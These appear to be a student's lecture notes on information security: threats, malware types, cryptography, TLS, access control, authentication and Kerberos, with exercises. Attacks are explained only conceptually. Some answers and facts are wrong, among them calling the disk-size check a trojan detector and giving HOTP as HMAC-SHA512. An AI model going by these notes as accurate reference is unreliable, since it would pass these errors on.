---
title: Information Security and Privacy
---

<!-- markdownlint-disable MD010 MD041 MD001 MD036 MD029-->

## Introduction to cyber threats

**Cyber threats**
Def 1: potential cause of an unwanted incident, which can result in harm to a system or organization

Types of threats:

- environmental threats: fire, water, pollution, earthquakes...
- loss of essential services: power, cooling, communication
- technical failures: disk failure
- cyber: malicious software, denial of service, social engineering, software vulnerabilities/exploits

### Motivation for attacks

Originally - curiosity, fun, fame

Now:

- profit - small crime, organized crime, industrial espionage
- beliefs (hacktivism) - e.g. Anonymous, Lulzec, Guardians of Peace
- national security - police forces, national intelligence

Profit (dark side):

- getting clicks on spam or ads
- resale of accounts, credit card numbers
- rental of hacked PCs (botnets)
- demand of ransom

Profit (gray side) - sell the vulnerabilities you discover to some broker

### Value of a hacked PC

Hacked PC has a lot of value for various exploits (see slide 0x01 6)

### Cyber attack lifecycle

Preparation:

- define target, from broad (everyone) to focused (individual)
- find and organize accomplices
- build and/or acquire tools
- research target (infra & people)
- test for detection

Gain access:

- deployment (social engineering, exploits, etc)
- initial intrusion
- outbound connection extablished

Maintain access:

- strengthen foothold - persistence, lateral movement
- expand access, obtain credentials

Complete mission:

- exfiltrate data
- manipulate, sabotage data

Cover tracks - delete log data

### Commodity threats

they are non-targeted ("shotgun" approach)
usually non-stealth and fully automated
goal is often short-term financial gains
often considered low-risk for the attackers
possible starting point for more sophisticated attacks

Forms:

- malware infected spam
- extorsion spam
- malicious ads
- computer worm

#### Malware spam

It is sent broadly to many people (i.e. not targeted)
Crude customization (e.g. Swiss Post, Linkedin)
Attachment contains well-known malware
Campaigns are life hours to days

#### Extorsion

Sent broadly to many people (i.e. not targeted)
Relies on leaked information, e.g. password lists
Convinces user of "hack"

### Hacktivism

Several meanings such as: politically moticated hacking, variant of (anarchic) civil disobedience

Good options:

- create software to encrypt communications
- create tools to bypass censorship

Cyber threats:

- website defacement (e.g. Anonymous, Lulzsec)
- Anonymous publication of confidential data (wikileaks, i guess)
- DDoS

#### Examples of Hacktivism

Panama Papers (2016):
Somebody stole and published documents about 214,000 offshore companies incorporated in Panama

Epik data breach (2021):
A group of hacktivists exposed customer personal and credit card information, company emails, etc. from websites hosting extremist content, called the ‘Panama papers of hate groups’

OpRussia (2022):
Anonymous launched cyber operations against the Russian Federation in retaliation for the invasion of Ukraine. Website defacement, email leaks from weapon manufacturers, hacked TV channels and surveillance cameras, etc.

### Advanced Persistent Threat

**Advanced** - targeted, multi-step attack, often uses specialized tools, often starts with spear-phishing (targeted phishing attack)

**Persistent** - 'low and slow' approach, prioritize long-term over short-term goals, conitnuous monitoring and interaction (attacks are known to have lasted 5 years)

**Threat** - human coordinated attack; attackers are skilled, motivated and well-funded (e.g. industrial espionage). No 'fire and forget' approach, not fully automated

#### Example of APT: RUAG

### Classes of Malware

Virus - spreads by infecting other files

Worm: spreads automatically to other systems

Trojan: malware hidden in useful software

Rootkit: hides presence of malware on computer

Ransomware: encrypts files and requests payment for decryption

Nation state malware: malware developed by a nation-state

#### Virus

Virus is a malware that infects a file and replicates by infecting other files

By definition, it does not propage automatically to other computers.

(Also, generic term for malware)

#### Worm

Worm is a piece of malware that propagates automatically

_Morris worm_:

- first internet worm, written by R T Morris at Cornell in 1988
- used vulneravilities in sendmail, finger and rsh software to propagate
- inteded goal - map the existing internet
- accidental side effect - computers could be infected multiple times, overloading them until they were unusable
- infected 10% of the internet (estimate)
- Morris got 400 hours of community service and 10k fine

#### Trojan

Strictly, a malware hidden in a useful software or file (e.g. pirated game)

More generally, a malware that stays on the victim's computer and communicates with a control center to carry out malicious activity

_ZeuS Trojan_:

- sold as kit for 3-4k
- infected millions of computers
- captures passwords and other information
- steals money through online banking
- over 100 people arrested (money mules)
- alleged mastermind was arrested in 2013

#### Rootkit

Rootkit hides the presence of malware on a computer

It patches the OS such that malicious files, processes, communications are not shown anymore

It makes it very difficult to detect and eliminate the malware

This is why you should boot from clean OS to search for malware on your system

Modern OSes verify the integrity of all privileged code (kernel, drivers, modules) before running them

Modern rootkits therefore modify the OS before it boots by infecting the boot sector or by infecting the BIOS!

#### Ransomware

Ransomware encrypts the files and requests payment for decryption

After payment is received, the decryption key is (often) obtained

Bitcoin has made it possible for malicious software developers to make a lot of money with little effort or risk

according to Symantec, in 2014 CryptoLocker extorted about 23mil

Typical ransom for private users are ~500, companies pay much more

Simple way of limiting rist are recent (offline, protected) backups

#### Nation-stae Malware: Stuxnet

Highly advanced malware

Used for targeted sabotage of Iran's nuclear program

Supposedly developed by an American-Israeli team

Exploited for 0-day exploits in Windows

Accidentally spread beyond its intended target due to a programming error

#### Botnets - compute for hire

Mirai botnet consists of 150k IoT cameras

Used to sell compute for, e.g. DDoS

DoS overwhelms target computer with large amount of requests

### Social engineering

"Hacking Humans" - use psychological tricks to manipulate another human

Social engineers use phishing, pretexting, baiting or tailgating

May target employees, customers or vendors

Intent to obtain sensitive information, gain unauthorized access, commit fraud

Prevented by awareness, training, and robust security measures

### Vulnerabilities and exploits

**Vulnerability** - weakness in logic, the software or hardware of a system (bugs)

**Exploit** - method/tool to take advantage of a vulnerability

Vulnerabilities can be fixed by patching a system

**Zero day exploit** - exploit which no patch exists yet because the developers don't know about it yet (since 0 days)

They can be mitigated by making them difficult to exploit - isolate the system or add multiple layers of security

#### Typical software vulnerabilities

Buffer / heap / stack overflows - violating memory safety

Unvalidated input, including SQL injection: mixing code and data

Race conditions: changes of the order of events cause a change in behaviour

Insecure file operations: incorrect assumptions about ownership, location or attributes

Side-channel leakage: leaking information via time, power, sound, etc.

Weaknesses in the implementation of access control: authentication and authorization flaws

## Exercises 1

**Exercise 1** Matching mechanisms
authenticity - message authentication code (keyed hash)
availability - duplicate/distribute system
confidentiality - isolation
intergrity - hash

**Exercise 2**
q: In your opinion, what is the most important technical means you need to have in order to be protected against ransomware attacks?
a: secured backups on a separate hardware, because if ransom is asked, then it is not required to pay out the ransom to get the information back.

**Exercise 3**
q: You are developing a website that sells cigarettes online in Switzerland. Imagine a cyber threat of each category below. For each threat, describe the goal of the threat and by which means the goal is achieved:

- Commodity threat - get money from highly profitable company. Extorsion.
- Hacktivism: goal - reduce smoking.

**Exercise 4**
q:In you opinion, is an anti-virus software a good protection against social engineering attacks carried out over e-mail? Explain why. What would be the best way of protecting against these attacks?
a: no, because the attacks are aimed at people, not software availability or infection. To protect against these attacks, it is best to spread awareness

**Exercise 5**
q: An anti-malware tool adds up the sizes of all files on a disk, adds the size of the empty space and compares it to the total disk size. What type of malware is this software trying to detect? Explain why.
a: trojan

## Crypto Basics

Goals of cryptography:

- Confidentiality - data is only accessible with the correct key
- Integrity - any modification of data can be detected (in security it says that it cannot be _modified_)
- Authentification - the author of a message can be identified
- Non Repudiation - the author of a message cannot deny being the author

### Naive approach to encryption

#### Rotation cipher

Two parties agree on an algorithm and keep it secret

Problem: if you know that it is a shift, it only takes 26 trials to break it.

So Kerckhoff's principle comes into effect: a cryptosystem should be secure even if everything about the system, except the key, is public knowledge

#### One-time pad

Key is a random string and at least as long as plaintext
Encryption - XOR operation to encrypt and decrypt

It is **perfect** in theory.

Disadvatages:
needs truly random uniform random one-time pad
key must not be used more than once
key length depends on the message length

It is benefitial when the communication is not immediate. Key can be exchanged once and then use it at some point in time.

### Symmetric Crypto

Encryption and decryptopm are done with the **same key**.
Solves the problem of transferring large amounts of confidential data by creating the problem of **key exchange**

#### Stream cipher

Use a key and pseudo random number generator to encrypt the data with the random bits (with XOR). Initialize RNG with key as seed.

Pros:
can encrypt data of arbitrary length

**Limitations**:

**Malleability** - if you flip one bit of the ciphertext, then one bit will be flipped in the cleartext.
E.g. if you know which bit encodes the sign of a value, you can change a payment from 100 to -100.
That is why ther should always be integrity check added when encrypting data

**Cipher-reuse** - if two messages are encrypted with the same stream, then there could be some bits leaked from the message.
$M_1 \oplus M_2 = C_1 \oplus C_2$
$M_2[k] = M_1[k] \oplus C_1[k] \oplus C_2[k]$

**Initialization vector**
Stream cipher with initialization vector (IV). IV has to be sent with each message. IV can just be a random number.

#### Block cipher

Encrypts a **fixed size** blocks of data

- a **padding scheme** is used to fill the last block (with random stuff)
- a **mod of operation** to combine multiple blocks

Data Encryption Standard (DES):

- block size 64 bits (too short, collisions)
- key size 56 bits (too short, can be brute forced) (because goverments wanted to be able to brute force)

Advanced Encryption Standard (AES):

- block size 128 bits
- key size 128/192/256 bits
- hardware support (e.g. Intel, AMD, ARMv8)

_When in doubt - use AES_

**Modes of Operation**:

**ECB**: Encrypt each block separately with the same key.

Problem - every block with the same data will look like encrypted same data

To solve this - we chain the blocks

**CBC** - cipher-block chaining.
Take some output from the cipher text and use that to XOR with the plaintext before encrypting the block with the key.
Basically the IV is the previous block's output.

Decryption is the opposite of encrytption.

**Problem**
If there is an error in one block it propagates: this effects the block (becomes garbage) that it is in and the following block (1 bit flip).

**Malleability**
Flipping one bit of IV, flips the same bit in the cleartext
Flipping one bit in a ciphertext block flips the same bit in the next cleartext block and mangles the current block
**Always** add **integrity check**

**Padding oracle attack** - padding needs to be carefully done.

### Data Integrity

**Integrity** - protects agains unauthorized modification

_It is easy to flip bits of the cleartext._

We need a primitive that:

- detects any modification of the message
- cannot be forged by an attacker

#### Hash function

take an arbitray length input and generate fixed length output.

**Porperties**:

- resistant to pre-image attacks (needs to be one-way function and is useful for password hashing) - hacker cannot find your password
- second pre-image resistance - given a message $m_1$ it is difficult to find a second message $m_2$ such that hash($m_1$) = hash($m_2$) - hacker cannot find a string that hashes to the same hash
- colision resistance - it is difficult to find any two messages $m_1$, $m_2$ such that hash($m_1$) = hash($m_2$) (usually that happens because we are compressing infinitely long text to some amount of bits)

What is the complexity of randomly finding a 2nd preimage in a random function that generates 160bit outputs (e.g. SHA-1)? - naively 2^160 (better: 2^80) ops, but in practice it took 2^63 operations to break SHA-1.

MD5 - broken
SHA-1 - broken in big investment
SHA-2 is the current standard but is related to SHA-1.
SHA-3 - no weakness known (not able to run on embedded system, because it is computationally more difficult)
BLAKE3 - no weakness known, faster, not standard

#### Message Authentication Codes (MAC)

Similar to hash function but involves a symmetric key
The same key is used to generate the MAC and to validate it.

If the key is know to two parties, a correct MAC proves:

- authentication
- integrity

This is similar to encryption but does not encrypt, just verifies.

### Authenticated Encryption

#### Confidentiality and Integrity

**Always** require both confidentiality **and** integrity.

Different approaches:

- encrypt, then MAC (e.g. IPSec, _use whenever possible_) - it allows first to check integrity and then decrypt
- MAC then encrypt (e.g. TLS)
- encrypt and MAC (e.g. SSH)

Modern encryption modes guarantee confidentiality and integrity.
They include additional data that is authenticated but not encrypted - used for seq number or other metadata.

AEAD (authenticated encryption associated data)
E.g. Galois/Counter Mode (GCM) - common standard together with AES.

### Public-key cryptography

Solves the problem to agree on a pre-shared symmetric key.

Uses a pair of **public** and **private** key.

Encrypt with a public key and decrypt with a private key.
Sign with a private key (add MAC) and anyone with the public key to check validity.

**Primitives**:

- public and private key
  - two keys: pub key is widely distributed, private is kept secrete
  - must be hard to derive priv from pub
  - may be easy to derive pub from priv
- Encryption and decryption
  - encrypt with pub key, decrypt with the priv key
  - hard to decrypt without private key

#### Digital signatures

private key allows signer to generate an unforgeable signature that attests to the validity of the message.

Examples: software updates, contracts.

#### Diffie-Hellman key exchange

Protocol for key exchange.

$K = g^{ab}\ mod\ n$

Algorithm: K = A^b % p = (g^a % p)^b % p = g^ab % p = (g^b % p)^a % p = B^a % p

**Problem**:
Man-in-the-middle attack. Giving the impression to Alice and Bob that they are safe.
Therefore there needs to be integrity through pub keys etc

#### RSA

n is product of thwo large primes p \* q

e is compirme with (p-1)(q-1), (ed-1) is multiple of (p-1)(q-1)

#### Eliptic curve cryptography (ECC)

Based on the eliptic curves over finite field.

Smaller keys for equivalent security.

ECC could be used for the key exchange, e.g. TLS: ECC Diffie-Hellman
Used for signature.

For example, Sony used ECDSA to sign software for Playstation 3.

#### Crypto Comparison

Asymmetric is powerful but orders of magnitude slower than symmetric crypto.

Assymetric is used to exchange a symmetric key, then symmetric takes over.

All these algorithms are on;y safe with ling enough keys (for 128bits of security):

- Symmetric 128 to 256 bits
- Asymmetric: RSA 3072 bits, ECC 256 bits
- Hash: 256bits

Cryptography is used IRL:

- Symmetric - Kerberos
- Asymmetric - WPA3 (not possible to crack WiFi passwords)

### Public key distribution

Public keys don't have to be secrete but have to be **authentic**.

#### Certificate Authority

We need a trusted 3rd party to distribute the public keys.

It does some validation before signing the keys:

- email
- copy of password
- this is documented in CPS (certificate practice statement)

If we trus the key of CA, we can trus all keys signed by the CA

A ‘signed key’ is a certificate. It contains at least:

- the identity of the holder (subject)
- the validity date of the certificate
- the public key of the subject
- the signature by the CA

**Hierarchy of trust**:
if you could break the root certificate, then you could create any certificate which would be valid but controlled by the attacker.
There are intermediary certificates to reduce to attack surface - if it is hacked, then everything is bad.

Current browsers have a set of root CAs.
If there is a chain of signatures up to a trusted root, the browser trusts the certificate.

### Crypto summary

Crypto can be symmetric (fast), asymmetric (slow)

Asymmetric should only be used to encrypt short data, as hash of document, a random symmetric key.

ECC is replacing RSA as asymmetric algorithm (it's faster, shorter keys)

Trus is not possible without a trust root.

### Case study: TLS

TLS provides confidentiality, integrity, and authentication.

Basic idea: build your client-server app without security, add TLS and it works.

#### Building blocks

The server is authenticated with a certificate
It proves its identity by signing some information received from the client with its private key.

Client and server create a symmetric key using asymmetric crypto.

#### Cipher Suites

Algorithms to be used are specified in cipher suits. E.g. TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256

There are 5 suites for v1.3.

#### Perfect Forward Security

**Strong security notion** - session keys should no be compromised even if long-term secrets are.
It is not related to the client or server data, and it is established after the key exchange. It must not be stored anywhere such that it does not get recovered.

Diffie-Hellman-like protocol offer Perfect Forward Secrecy (PFS)

#### TLS uses public and symmetric crypto

Public key crypto:

- The CA has signed the server’s certificate (and its own root certificate)
- The server signs the key exchange to prove it holds the private key
- Elliptic curve Diffie Hellman is used to exchange a symmetric key

Symmetric crypto:

- AES block cipher is used in CBC mode for encryption
- SHA hash is used for HMAC, for key derivations

#### Weaknesses in TLS

There have been attacks that broke it.

Downgrade attacks
Padding oracle attacks

#### Implementing TLS

Assign a new port (HTTPS uses different port), start with TLS handshake, not compatible with clients that can't TLS.

Put STARTTLS command on the standard protocol.

#### Deploying TLS on the Internet

Using HTTPS is becoming default for Privacy and Security

#### Let's encrypt - Free certificates

To be able to create certificates that are trusted by all browsers, you must undergo a certification.

To obtain a certificate, you must place specific data

- in a file on your web server, or
- in a DNS entry of your domain

Fully automatable: no excuse for not using TLS.

Let's Encrypt certificates have to be regenerated every few months because certificate revokation is broken (if it is attacked, the certificate is still valid until the end of the certificate).

#### Attacks on HTTPS and defences

SSL Stripping - a MITM makes you believe that the site uses HTTP instead of HTTPS.
Defence - HSTS - HTTP Strict Transport Security. It has a preload list that has web addresses that should not be connected through HTTP.

Untrustworth CAs - any CA can give the MITM a trusted certificate in the name of any server. Using this the server can intercept the server traffic.
Defence:

- certificate pinning - client-side list of trusted certificates. If the server shows a certificate which is not signed bu this pin, it does not accept to connect.
- Certificate transparencry - public list of certificates. Servers can check who requested certificates for their domain and clients can verify that a cert received from server is in the logs.

### Exercises 2

1. Why can’t you use a message authentication code (e.g. HMAC-SHA2) to sign a contract between a buyer and a seller?
   - Buyer and seller would need to exhange a symmetric key to verify the contract and MITM could impersonate the seller.
2. If asymmetric crypto is really more useful than symmetric, why are we still using AES?
   - Because symmetric crypto is easier and faster computationally.
3. Explain why using the same initialization vector (IV) multiple times with a stream cipher is more dangerous than with a block cipher.
   - Stream cipher would reveal more statistical invormation
4. Explain why AEAD is not malleable
   - AEAD not only encrypts data but also preserves its integrity, and, for example, in IPSec if the data is modified, it is not being decrypted.
5. Describe an attack that would work if it was possible to find second pre-images for a hash function.
   - Brute-force attack with a wordlist
6. How can you find out all cipher suites supported by a TLS server?
   - _A_:
7. Why is perfect forward secrecy important?
   - this is so that MITM attack could not take place, since if the session key is obtained, there is no authetication guarantee.
8. To be sure that your customers connect to your website with https instead of http, you configure your web server to answer requests on the http port with a redirection to the https port.
   • _Q_: Why does this not guarantee that all customers will end up using https?
   _A:_
   • _Q_: Why does closing the http port still not guarantee that customers will use https?
   _A:_
   • _Q_: What would be a working solution?
   _A:_
9. Most mobile e-banking applications use certificate pinning to validate the certificates of the servers they connect to. Describe an attack that can be prevented by using a pinned certificate.
   - _A_:
10. Which certificate authorities have been used to sign the certificate of the [www.epfl.ch] web server?
    _A:_

## Access control

How we can control who gets access to certain object?

### Basics

Defines and enforces **operations** that **subjects** can do on **objects**

E.g. Person has permission to read/write from a socket
(this implies that the subject has been authenticated first)

#### Security policy

**Access rights** describe which subjects can do what operations on what objects.

A **security policy** is a collection of access rights. Security policies can be represented as an access control matrix. It shows what subject can do what on the object.

#### Security mechanism

**Security mechanism** tries to prevent operations that are not authorized bu the security policy.

Allow-list - anything that is not allowed implicitly is denied.
Deny-list - anything that is not denied is allowed. (worse because we will only figure out if something is not denied after the attack)

#### Principle of Least Privilege (PoLP)

- subjects only have the minimum rights required for their job
- i.e. subjects are only allowed minimal operations on objects per task
- this limits the impact if anything should go wrong

This also limits the impact of something going wrong.

The challenge in access control is to have a system that is simple to implement and manage and that is close to the principle of least privilege.

**This is the most important access control principle**

Another way to look at it: if you cannot remove any right without taking away functionality

#### Multiple levels of access control

In a network there could be several layers of AC: firewall, server, application

This provides a question of tradeoff:

- we want to filter as early as possible, and as early as we can make a decision (e.g. ssh at firewall level)
- only one configuration screw-up would result in successful attack
- bug effects are diminished
- sometimes other layers don't have the correct semantics (e.g. user profiles in an application is just a file for OS)

### Multiple Approaches to access control

- Role-based Access Control (RBAC)
- Discretionary Access Control (DAC)
- Mandatory Access Control (MAC)

#### RBAC

Simplifies the specification of permissions by grouping users into roles.
(Centered on user roles)

A role can contain multiple permissions.

Why is such a role based system useful?
If the system was just users and rights, it would become a very complicated matrix. Roles simplifies that because it is an abstraction to group a certain set of roles.

Each subject can have multiple roles. (In Unix each object can only be in one group - that's just implementation)

##### Example RBAC implementation - OS

Most OS have the notion of groups
Groups can be given a set of permissions
Users can be added to groups

##### RBAC Pros

Easy to grasp the idea of roles

Easy to manage (roles decouple digital entities from permissions)

Easy to tell through roles which permissions a subject has and why (typically centrally managed)

##### RBAC Cons

Difficult to decide on the granularity of roles - how deep the role has the access in; leads either to role explosion or roles that are too broad

Role meaning is fuzzy (based on human explanation)

Uncliear if roles can be shared across differen departments

#### Discretionary Access Control (DAC)

Someone owns the file, and ownes specifies policies to access resources it owns

Represented by access control list (ACL)

**ACL** vs **Capabilities**
It could be seen as a door protected by the bouncer bs a door protected by the lock

ACL (bouncer):
the bouncer knows exactly who can get in
People don't know where they can get in and where they can't

Capabilities (key, tied to subject):
Doors don't know hwo will show up with a key
People know exactly for which doors they have a key

ACL is practical when you often have to create or modify rights on objects
Capabilities, when you often create or change rights of subjects or roles

##### DAC in Unix FS

Done with ACL
Stored in the target object (in the metadata)
subjects are grouped in three categories - owner, group, other.

Three access rights - read, write, execute

Why is it possible for the owner not to be able to rwx? - remove permissions from yourself from overwriting accidentally.

Only the root has access to modify they /etc/gufw/app_profiles file

setuid/setgid sets a user/group bit to rights to the file such that the file will be run with the permissions of the owner of the file rather than the permissions of the user/group

Programs with setuid can be very dangerous. This is because programs with setuid bit set are privileged and if they have any bug in them that could be used to escalate the privileges of the user.

##### Capabilities in Linux

Capabilities are permissions that are related to a subjec, not to an object.

Linux supports capabilities for processes. e.g.:
CAP_CHOWN - make arbitrary changes to file user ID and group ID
CAP_DAC_OVERRIDE - bypass file read, write, and execute permission checks

Example: dumpcap is the program used by wireshark to sniff network traffic:

- it can only be run by root and the members of the wireshark group
- it does not have the setuid bit

It is most of the time safer than using setuid

##### ACL in Windows

ACL is not limited to three types of subjects (used, group, other) - objects can have a list of ACLs for different users and groups

The Windows administrator account is not the highest privileged account. The system account NT Authority\system is the one that runs the system and launches services.
Thus, you can configure anti-virus software in a way that even administrators cannot remove it.

##### Capabilities in Windows

Windows has priviliges that act like capabilities:

- SeTimeZonePrivilege - change time zone
- SeSystemtimePrivilege - can change the system time
- etc

#### DAC pros and cons

Pros:

- flexible
- easy to manage (owners get to set the permissions themselves)
- intuitive

Cons:

- depends on the owners judgement
- only works if programs are not malicious and users make no mistakes
- vulnerable to the "Trojan"/declassification problem - a malicious program run by tan authorized user can read a protected file and write an unprotected copy of that file. Anybody can read the file.

#### Mandatory access control (MAC)

Tries to ensure that even someone with access cannot leak the data

Historically associated with military-grade information security (multilevel security - unclassified, confidential, secret, top-secret)

The system lables both subjects and objects with security labels (can only be modified by trusted administrators via trusted software)

Security policy: Subjects can only access objects of the same or lower level

| subjects/objects | top-secret | secret | confidential | unclassified |
| ---------------- | ---------- | ------ | ------------ | ------------ |
| top-secret       | rw         | r      | r            | r            |
| secret           | -          | rw     | r            | r            |
| confidential     | -          | -      | rw           | r            |
| unclassified     | -          | -      | -            | rw           |

Depends on trusted software and admins for:

- keeping the system in a protected state, prevents operations that violate the rules of the matrix
- labeling new subjects and objects
- perform transitions of labels (e.g. when document is declassified)

Can be used in conjunction with DAC or RBAC

**"no-write-down" problem**:
A secret subject may read a secret file and write the contents into a confidential file, thereby reclassifying the secrecy level and downgrading it (that's why secret subjects can write only in secret documents)

##### MAC Confidentiality vs Integrity

MAC and Confidentiality:

- When protecting confidentiality, we don't want users to write to a lower level (**no write-down**)
  - prevents leaking information from higher to lower levels ("trojan")
- Tpical scenario - network access control
  - network is split in zones - internet, internal, secret
  - firewalls only allow data to flow lower zones to higher zones

MAC and Integrity:

- We don't want users from lower level to write into higher levels (**no write-up**)
  - prevents unauthorized modifications
- E.g.: OS - users can read and execute OS programs but cannot modify them

##### MAC in Windows

Windows implements MAC for integrity protection (Mandatory Integrity Control)
4 integrity levels - low, medium, high, system

Objects have a label that says whether write-up, read-up, or execute-up are allowed.
Internet browsers and other programs processing files received from internet run in low integrity level

##### MAC in Linux

SELinux and AppArmour are two MAC systems form Linux.
They are both based on the generic Lunux Security Module (LSM)

LSM sits in the kernel and is called just after standard DAC checks and before access is given

SELinux is used in Android - creates context on the name, role and domain
AppArmour user profiles define access rights to files, network and capabilities. Is enabled by default in ubuntu

##### MAC pros and cons

Pros:

- Addresses the limitations of DAC
- Easy to scale

Cons:

- Can be too restrictive, prevent legitimate tasks
- Not flexible

#### Summary of access control

Different types of access control, usage depends on situation:
**Aim** - achieve least privilege at minimal complexity

Moder OSes make use of all of these types:

- DAC with ACLs for files and most objects
- DAC with capabilities for privileged operations
- Using groups to implement RBAC (users, admins, hr, marketing)
- MAC for protecting the integrity of the system

### Authentication

Access control only makes sense if subjects are authenticated.

3 common flavors to authenticate:

- something you know - passwords, pin codes
- something you own - paper card, smartphone, certificate, electronic token
- something you are - biometrics

Two factor authentication requires the use of two factors - password is often one of the two factors

#### Even strong passwords are at risk

a stolen password can be replayed by anybody

An attacker can:

- steal password using client-side malware
- obtain passwords by cracking hashes stolen from a server
- phish passwords
- easesdrop the password

Credential stuffing:

- lists tof usernames and passwords are distributed online
- hackers try the same credentials on many different sites

#### Password managers

Store all your credentials in encrypted form

- your **master password** is used to decrypt the credentials
- to be used on different devices, the encrypted credentials must be accessible online

Where are passwords stored:

- password manager works offline, uses local file (Keepass)
  - you can choose to host this file in the cloud
- password manager talks to a server in the cloud (Lastpass)
  - browser plug-in or app downloads credentials and decrypts them locally
  - you must trust them not to steal your master password
- best of both - the password manager comes with an open source server that you can host where you want (Bitwarden)

#### Authentication/session cookies

Cookie is kept by the client and used for authenticating against the server.
Cookie should be uniques for every subject
Cookie can be used bu several clients through forging (if the server encrypts the cookie it hinders the forging - HMAC)

#### Something you own

Typically called hardware/software token.

Bingo card:
proves that the user owns the card
can easily be copied without being detected

One time password (OTP) token:
Displays a password to be used only once
Password changes with time or click
Proves that user owns token at time of login
Cannot be copied easily (secure hw)
OATH standard

TAN generator:
a calculator that generates a number based on user input
can be used to sign a transaction (Transaction Authentication Number)
Proves that user owns generator
based on a smartcard (secure hardware), typically your bank card

Smartphone
OTP is sent by SMS or
OTP is generated by app as with OTP token
Proof that user owns phone (or sim card)

Private key in hardware token
token signs a challenge
different key for different websites
proof that user owns token
secure hardware
Universal 2nd Factor (U2F) standard

#### OATH, generation of OTP

**OATH** is a standard that describes:

- how OTPs are generated from a seed
- an XML format for importing seeds into an authentication server

Standard OATH tokens exis as hw and sw (e.g. Google Authenticator app)
Generation of the next OTP is either counter or time based RFC4226

##### OATH algorithms

Counter based:
hotp(k, c) = truncate(hmac - sha512(k,c))

Time-based (initial time t0, time interval x):
totp(k, t) = hotp (k, (t - t0) / x)

Tradeoffs?: ---

#### RSA Secure IDs

Secure IDs implement a form of totp
Requires random seed to be synced device and customer

In a massive hack, attackers stole ALL seeds from RSA - the first true supply chain attack

#### U2F, FIDO2

**Universal 2nd Factor** is a standard developed by the **FIDO** alliance

Latest version is FIDO2

For each application, the token generates a key pair and gives the public key to the server

On login, the server sends a random challenge to the client:

- the client signs the challenge + the name of the donmain of the server + a signature counter
- the client sends the data and the signature to the server
- the server verifies the signature

Adding the domain prevents phishing attacks
Adding the counter detects cloning of the private key/replay attacks

**WebAuthn**:
FIDO2 standardizes U2F within the browser with JS (called WebAuthn)

Additionally makes use of **CTAP** to access the signature
CTAP, the Client to Authenticator Protocol, describes how an application can ask an authenitcator to generate an assertion (signature)

Authenticator can be:
USB token
Smartphone connected by Bluetooth
Authentication module of platform (e.g. biometric)

The assertion contains information whether the user

- was present
- was verified

Pros:

- No problem if the server gets hacked
  - it's an asymmetric system, the information stored on the server cannot be used to log in
- No problem if the client gets hacked
  - private key stays in secure hw of client
  - usage of the key is only possible with user interaction
- very convenient
  - it can use the native authenctication system of the platform

#### Biometrics

Motivation:
Something you know could be guessed
Something you own could be stolen
Nothing to remember, nothing that can be lost

**Authentication process**:

- Registration
  - Acquisition
  - Extraction of characteristics (iris, retina, fingerprint, shape of head, shape of hand, speech, keystroke timing, handwritten signature on tablet, gait)
  - storage of characteristics
- Authentication
  - acquisition
  - comparison
  - decision

Limitations

- Acquisition is never exact
- Comparison is never a perfect match (biometric information cannot be hashed)
- Decition is always error prone

**Error rates**:
The decision algorithm must accept a certain error, sensitivity can be tuned:
FAR (false acceptance rate): the system declares a match when it wasn't
FRR (false rejection rate): the system declares a non-match although it was a match
EER (equal error rate): when the system is tuned such that FAR=FRR

**Biometrics Discussion**:
Biometrics and authentication:

- no hashing possible (neither for transmission nor for storage), risk - theft
- it is impossible to change a stolen finger
- best to store the biometric data locally in protected hw
- Example:
  - biometric are stored in passports, not at the customs offices
  - smartphones store fingerprint data in separate, secure hw
- some sensors can be fooled or replaced
- not ideal for remote authentication
  - rather use it for local access to auth key

Biometrics and privacy:

- biometric data is considered sensitive data by European data protection laws and the Swiss law:
  - previous Swiss law considered sensitive when revealing race or health
- Biometric data can reveal health issues (e.g. eye pathologies)
- Biometric data can exclude some people (absence of fingerprints or fingers)
- A los of more or less serious research is done with ML and AI to extract inofmration from faces

### Authentication protocols

(when sending a password over TLS is not enough)

#### Challenge-response

Rather than sending the password to the server:
Server sends a random challenge to the client
The client uses the password hash to create a respose (e.g. encryption or HMAC of the challenge)

Typically, challenge response protocols are vulnerable to MITM attacks.
Microsoft introduced the signature of the packets with a key derived from th pwd hash (it is actually an HMAC) - the MITM does not know the key, cannot send any packets

**Mutual authentication**:
The server and client can both use a challenge: they can authenticate each other

Examples:

- newer versions of microsoft challenge-response (SMBv2)
- WiFi WPA, WPA2, WPA3

Challenge-response protocols may be eavesdropped or suffer cracking attacks:
the attacker recordsa challenge and a response, then they try all possible passwords to find which would yielf the same response

#### Kerberos

Kerberos provides authentication and authorization across a network
Subjects receive tickets that they use to access objects

Exclusively based on symmetric keys
(developed at MIT in the 80s, initially deployed in Unix)
The main authentication protocol in windows networks

##### Kerberos tickets, authenticators

By presenting a ticket a client gets access to a service from a server

The authenticator proves that the client is the legitimate owner of the ticket.

The ticket contains:

- c - the client's identity
- a - its IP
- v - a validity period
- Kc,s - a session key used between the client and the destination server.

The ticket is encrypted with the key of the destination server.

The authenticator is an id and a timestamp encrypted with a session key.

##### Kerberos authentication server, ticket server

Kerberos uses a 3-phase approach:

- 1-2 - an authentication server (AS) authenticates the client and delivers a ticket granting ticket (TGT)
- 3-4 - the client can then present the TGT to the ticket granting server (TGS) to get a ticket for the service
- 5-6 - the client can access the service

##### Kerberos authentication

The password hash is used as key Kc

1. The client asks for a ticket for the TGS, sends _c,tgs_
2. the AS responds with the ticket T_c,tgs (the ticket granting ticket) and an encrypted session key ENC_Kc(K_c,tgs)

the client knows Kc and can decrypt the session key

##### Kerberos authorization

the client creates an authenticator with K_c,tgs

3. the client sends the ticket T_c,tgs and A_c,tgs to the TGS.
4. the TGS verifies the authenticaor and responds with a service ticket T_c,s and an encrypted session key ENC_K_c,tgs (K_c,s)

The client knows K_c,tgs and can decrypt the session key.

##### Kerberos access

the client creates an authenticator with K_c,s

5. the client sends the ticket T_c,s and A_c,s to the server
6. the server verifies the authenticaor

the client can now use the service

##### Kerberos discussion

the ticket obtained from the AS is called the **ticket grantic ticket (TGT)** because it is used to get the other tickets

To validate a ticket, a server:

- decrypts the ticket
- validates the **IP address** and the **validity period**
- uses the included session key to
  - decrypt the authenticator
  - verify that it contains the same id c as the ticket
- verifies that the authenticator is fresh
- verifies that the same authenticator has not been used in the last time period

Tickets are typically valid for eight hours

##### Kerberos attacks

MITM attacks - not possible:

- the attacker does not know the session keys (Kc, K_c,tgs, K_c,s)
- the attacker does not know the keys K_tgs, Ks used to encrypt the tickets
- the attacker cannot create/modify any ticket or authenticator

Replay attack: not possible

- Attacker cannot replay an old authenticator, only fresh ones are accepted
- Attacker cannot replay fresh authenticators, servers keep a list of the last
  authenticators received

